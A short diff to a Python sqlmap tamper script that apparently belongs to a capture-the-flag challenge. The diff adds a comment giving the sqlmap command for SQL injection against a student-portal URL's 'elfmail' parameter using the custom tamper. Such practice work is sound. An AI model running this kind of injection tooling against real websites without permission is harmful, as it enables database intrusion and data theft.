@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 
+###run with sqlmap -u "https://studentportal.elfu.org/application-check.php?elfmail=" --tamper=mytamper -p elfmail 
+
 from lib.core.data import kb
 from lib.core.enums import PRIORITY
 
